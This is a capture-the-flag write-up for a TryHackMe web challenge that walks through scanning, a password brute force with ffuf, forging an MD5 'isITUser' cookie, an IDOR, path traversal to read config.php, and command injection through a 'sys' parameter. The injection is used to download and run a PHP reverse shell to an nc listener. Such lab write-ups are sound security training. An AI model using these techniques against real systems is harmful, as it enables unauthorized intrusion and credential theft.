https://tryhackme.com/room/support

    A new internal **Support Operations Platform** has been deployed to assist IT and helpdesk teams. The application handles user management, internal APIs, and system-level operations. However, security was not the primary focus during development. Several features rely on user-controlled input and weak trust boundaries.

What is the flag value after logging in as `admin`?

What is the content of the file `/home/ubuntu/user.txt`?

---


## Reconnaissance 

First, I scanned the target IP address using Nmap to identify open ports and the services running on them.


```bash
$ nmap -sS 10.128.137.164

Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-25 17:50 +0100
Nmap scan report for 10.128.137.164
Host is up (0.046s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.34 seconds
```

I found two open ports. One of them hosts a web application, so I opened it in my browser.

![](images/Pasted%20image%2020261028131008.png)

For convenience, I added  the `support.thm`domain to `/etc/hosts`.


```bash
sudo nano /etc/hosts
```

![](images/Pasted%20image%2020261025190924.png)

The website contains a login form. When I entered arbitrary usernames and passwords, the application returned an "Invalid credentials"message.

The only valid email address I found on the page was `help@support.thm`, so I decided to test it with a password wordlist using ffuf.

I also used ffuf to enumerate possible endpoints.


```bash
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://support.thm/FUZZ -e .php,.txt,.bak,.old,.conf,.zip 


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.3.0
________________________________________________

 :: Method           : GET
 :: URL              : http://support.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .bak .old .conf .zip 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
______________________________________________
footer.php       [Status: 200, Size: 1253, Words: 377, Lines: 39, Duration: 44ms]
skins            [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 37ms]
includes         [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 36ms]
layout           [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 39ms]
js               [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 41ms]
api.php          [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
logout.php       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
config.php       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 41ms]
dashboard.php    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
.php             [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 36ms] 

```

---


## Enumeration

I then tried to identify the password for `help@support.thm`using a common-password wordlist.

```bash
─$ ffuf -w /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt -X POST -d "email=help@support.thm&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://support.thm/ -fs 2678 


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.3.0
________________________________________________

 :: Method           : POST
 :: URL              : http://support.thm/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : email=help@support.thm&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2678
________________________________________________

{ REDACTED password}              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 38ms]
:: Progress: [10000/10000] :: Job [1/1] :: 1020 req/sec :: Duration: [0:00:10] :: Errors: 0 ::

```

Using the discovered password, I logged in and accessed the dashboard.

![](images/Pasted%20image%2020261025201042.png)

I intercepted a request using Burp Suite to inspect the authentication-related parameters, including the cookies. 

```Burp Suite 
GET /dashboard.php HTTP/1.1
Host: support.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://support.thm/dashboard.php?skin=green
Cookie: PHPSESSID=b6llpsiu3b4i19815ufkkjbolc; isITUser=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

The `isITuser`cookie contained an MD5 hash. I used CrackStation to identify its value.

![](images/Pasted%20image%2020261025201941.png)

I then calculated the MD5 hash of `true`.

```bash
└─$ print -n "true" | md5sum
b326b5062b2f0e69046810717534cb09  -
```

I changed the cookies value in the browser's developer tools to the hash calculated above.

![](images/Pasted%20image%2020261025202853.png)

After refreshing the page, I gained access to `/api.php`.

![](images/Pasted%20image%2020261025203146.png)

This allowed me to access a new endpoint called `/users`.

![](images/Pasted%20image%2020261025203441.png)

I tested the endpoint for IDOR (BOLA) and found the administratior's email address. Screen contained the user's 1 data instead 3

![](images/Pasted%20image%2020261025203909.png)

The administrator's email address was:

```email
specialadmin@support.thm
```

I still needed to find the password.

---


## Exploitation

I then tested the `skin`parametr, which controls the website's color theme.
By modifying its value and using Path Traversal, I was able to access the application's configuration file. `config.php`. The file contained the administrator's password. (but also the password contained an extra character "@" )

![](images/Pasted%20image%2020261025210832.png)


With these credentials, I logged in as the administrator.

![](images/Pasted%20image%2020261025215540%201.png)

Next to the theme selector, I noticed another form that allowed me to display the date or time on the page. I decided to test this feature for LFI , since it appeared to process user-controlled input.

![](images/Pasted%20image%2020261025221134.png)

I intercepted the request and noticed that the POST body contained a parameter named `sys`. I suspected that it was used to execute a system command.

When I changed its value to the following, the application responded that only `date` could be used as the command. 

```http
sys=cat /home/ubuntu/user.txt
```

This indicated that the application restricted the command input but might still be vulneable to command injection.
I then attempted to append my command to `date`using a pipe.

![](images/Pasted%20image%2020261025220343%201.png)

The command executed successsfully, and I obtained the flag from `/home/ubuntu/user.txt`.

---


## Remote Code Execution

The challenge also asked me to achieve Remote Code Execution (RCE) in the server.

I perpared a PHP reverse shell named `code2.txt` to test whether the previously identified `sys`parameter was vulnerable to RFI (OS command injection that could be used to execute a downloaded script)

First, I started a listener on port 9001 on ny machine.

```bash
 nc -lvnp 9001
 
 listening on [any] 9001 ...
```

In another terminal, I started an HTTP server on port 4444 from the directory containing `code2.txt`

```bash
python3 -m http.server 4444
```

I used `wget`on the target server to download the script.

![](images/Pasted%20image%2020261026205851.png)

Lets check it.

![](images/Pasted%20image%2020261026204050.png)


The reverse shell script was downloaded. Next, I needed to exrcute it , so I changed the parameter value to:

```parameter
sys=date+%2B%22%25H%3A%25M%3A%25S%22; php code2.txt
```

The listener received a connection from the target.

```bash
listening on [any] 9001 ...
connect to [MY-IP-ADDRESS] from (UNKNOWN) [TARGET-IP] 42804
Linux tryhackme-2404 6.14.0-1018-aws #18~24.04.1-Ubuntu SMP Mon Nov 24 19:46:27 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 20:06:31 up 58 min,  0 user,  load average: 0.15, 0.03, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ df
Filesystem     1K-blocks    Used Available Use% Mounted on
/dev/root       76158456 3099952  73042120   5% /
tmpfs             480180       0    480180   0% /dev/shm
tmpfs             192076     840    191236   1% /run
tmpfs               5120       0      5120   0% /run/lock

```

I obtained RCE as `www-data`.

---


## Summary

1. **Reconnaissance** — Identified the SSH and HTTP services and enumerated web application endpoints.

2. **Enumeration** — Discovered working credentials, examined authentication cookies, and identified the administrator's email address through the API.

3. **Exploitation** — Used Path Traversal to read the application's configuration file, recovered the administrator's password, and accessed the application as `admin`.

4. **Command Injection** — Exploited the command-processing functionality to read `/home/ubuntu/user.txt`.

5. **Remote Code Execution** — Downloaded and executed a PHP reverse shell, obtaining a shell as `www-data`.
